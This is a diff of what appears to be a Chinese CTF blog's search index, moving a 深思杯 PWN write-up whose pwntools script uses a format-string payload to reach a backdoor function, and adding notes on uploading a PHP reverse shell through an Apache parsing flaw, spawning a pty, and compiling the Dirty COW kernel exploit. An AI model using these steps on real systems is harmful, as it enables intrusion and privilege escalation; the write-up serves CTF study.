@@ -18518,8 +18518,15 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>可以利用 apache 的解析漏洞传一个 xxx.php.jpg 的上去<br>然后反弹个 shell</p>
-<p>python3-c”import pty;pty.spawn(‘/bin/bash’)”</p>
+<p>可以利用 apache 的解析漏洞传一个 xxx.php.jpg 的上去，然后 php 写个反弹 shell<br>（再次记录一下下面这一句，总是忘了 Orz）<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>利用脏牛提权<br><a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40839</a><br><code>gcc -pthread 40839.c -o exe -lcrypt</code><br>用这个的时候注意换到 /bin/bash 这一个，之前在蚁剑的终端里试了几次没交互效果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603589780205-b77deb3d-e098-4740-b9f2-0a5dc42894d3.png#align=left&display=inline&height=475&margin=%5Bobject%20Object%5D&name=image.png&originHeight=735&originWidth=859&size=711963&status=done&style=none&width=554" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 ]]></content>
   </entry>
   <entry>
@@ -19213,40 +19220,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>深思杯-PWN</title>
-    <url>/2020/06/23/ygucy4/</url>
-    <content><![CDATA[<p><strong>把之前比赛的题目做做</strong><br>当时放弃拯救的我，把所有能保存的题目都保存了下来<br><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/268938/1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip?_lake_card=%7B%22uid%22%3A%221593043441814-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F268938%2F1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip%22%2C%22name%22%3A%22%E6%B7%B1%E6%80%9D%E6%9D%AF2019%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B.zip%22%2C%22size%22%3A66903512%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22Szkj0%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">深思杯 2019 山东省大学生网络安全技能大赛.zip</a></p>
-<h1 id="MinZhu"><a href="#MinZhu" class="headerlink" title="MinZhu"></a>MinZhu</h1><p>首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以<br>找出来 key 是 xNd9y6</p>
-<p>然后看一下位置，第四个</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>然后， 程序有一个后门，覆盖后面要执行的一个函数的地址为它就能打印出 flag 了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007357895-cafc3074-54db-49de-9140-0513a990cd34.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=833&size=41731&status=done&style=none&width=490" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Key:"</span>)</span><br><span class="line">p.sendline(<span class="string">"xNd9y6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line">print(len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007402886-ae2d5924-b2f4-4bf7-a3cb-6129edcaf182.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1153&size=267900&status=done&style=none&width=617" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-]]></content>
-  </entry>
-  <entry>
     <title>逆向-z3约束器解题</title>
     <url>/2019/11/30/yiqtuu/</url>
     <content><![CDATA[<p>安装：<code>pip install z3-solver</code></p>
@@ -19280,6 +19253,40 @@
 <h2 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h2><p>从 git 仓库下载代码的时候，会在本地生成一个.git 隐藏文件夹(存放代码的变更记录)，导致攻击者可以使用该文件夹下的信息拿到代码。<br>PS：利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p>
 <h2 id="DS-Store-泄漏"><a href="#DS-Store-泄漏" class="headerlink" title=".DS_Store 泄漏"></a>.DS_Store 泄漏</h2><h2 id="SVN-代码泄露"><a href="#SVN-代码泄露" class="headerlink" title="SVN 代码泄露"></a>SVN 代码泄露</h2><h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><p>rebots.txt</p>
 <h2 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h2><p>index.php.swp<br>index.php.bak</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>深思杯-PWN</title>
+    <url>/2020/06/23/ygucy4/</url>
+    <content><![CDATA[<p><strong>把之前比赛的题目做做</strong><br>当时放弃拯救的我，把所有能保存的题目都保存了下来<br><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/268938/1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip?_lake_card=%7B%22uid%22%3A%221593043441814-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F268938%2F1593043485001-e20cbb50-bdb9-4457-af50-9d47819e1a8f.zip%22%2C%22name%22%3A%22%E6%B7%B1%E6%80%9D%E6%9D%AF2019%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B.zip%22%2C%22size%22%3A66903512%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22Szkj0%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">深思杯 2019 山东省大学生网络安全技能大赛.zip</a></p>
+<h1 id="MinZhu"><a href="#MinZhu" class="headerlink" title="MinZhu"></a>MinZhu</h1><p>首先有一个检测，要把 key 找出来才能进入，使用 angr 就可以<br>找出来 key 是 xNd9y6</p>
+<p>然后看一下位置，第四个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593006419656-9da39620-8890-4e02-b194-83808db6e702.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=617&size=30383&status=done&style=none&width=446" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后， 程序有一个后门，覆盖后面要执行的一个函数的地址为它就能打印出 flag 了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007357895-cafc3074-54db-49de-9140-0513a990cd34.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=833&size=41731&status=done&style=none&width=490" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Key:"</span>)</span><br><span class="line">p.sendline(<span class="string">"xNd9y6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line">print(len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593007402886-ae2d5924-b2f4-4bf7-a3cb-6129edcaf182.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1153&size=267900&status=done&style=none&width=617" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 ]]></content>
   </entry>
   <entry>
